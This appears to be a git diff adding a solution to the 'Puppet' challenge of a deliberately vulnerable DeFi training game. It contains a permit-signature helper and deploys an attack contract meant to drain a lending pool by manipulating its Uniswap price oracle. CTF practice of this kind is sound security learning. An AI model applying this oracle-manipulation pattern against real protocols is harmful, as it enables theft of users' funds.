@@ -1,4 +1,4 @@
-const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
+const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json"); 
 const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
@@ -10,9 +10,67 @@ function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReser
     return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
 }
 
+async function getPermitSignature(
+    wallet,
+    token,
+    spender,
+    value,
+    deadline,
+  ) {
+    const [nonce, name, version, chainId] = await Promise.all([
+      token.nonces(wallet.address),
+      token.name(),
+      '1',
+      wallet.getChainId(),
+    ])
+  
+    return ethers.utils.splitSignature(
+      await wallet._signTypedData(
+        {
+          name,
+          version,
+          chainId,
+          verifyingContract: token.address,
+        },
+        {
+          Permit: [
+            {
+              name: 'owner',
+              type: 'address',
+            },
+            {
+              name: 'spender',
+              type: 'address',
+            },
+            {
+              name: 'value',
+              type: 'uint256',
+            },
+            {
+              name: 'nonce',
+              type: 'uint256',
+            },
+            {
+              name: 'deadline',
+              type: 'uint256',
+            },
+          ],
+        },
+        {
+          owner: wallet.address,
+          spender,
+          value,
+          nonce,
+          deadline,
+        }
+      )
+    )
+  }
+
 describe('[Challenge] Puppet', function () {
     let deployer, player;
     let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;
+    let attack;
 
     const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
     const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;
@@ -35,7 +93,7 @@ describe('[Challenge] Puppet', function () {
         // Deploy token to be traded in Uniswap
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
 
-        // Deploy a exchange that will be used as the factory template
+        // Deploy an exchange that will be used as the factory template
         exchangeTemplate = await UniswapExchangeFactory.deploy();
 
         // Deploy factory, initializing it with the address of the template exchange
@@ -94,7 +152,17 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const sendEth = (await ethers.provider.getBalance(player.address)).sub(5n*10n**17n);
+        const deadline = ethers.constants.MaxUint256;
+
+        const AttackFactory = await ethers.getContractFactory('AttackP', player);
+        const nonce = await ethers.provider.getTransactionCount(player.address);
+        //finding attack.address before deploying
+        const attackAddress = ethers.utils.getContractAddress({from: player.address, nonce,});
+        
+        const {v, r, s} = await getPermitSignature(player,token,attackAddress,PLAYER_INITIAL_TOKEN_BALANCE,deadline);
+
+        attack = await AttackFactory.connect(player).deploy(lendingPool.address,token.address,uniswapExchange.address,player.address,PLAYER_INITIAL_TOKEN_BALANCE,deadline,v,r,s,{value: sendEth});
     });
 
     after(async function () {
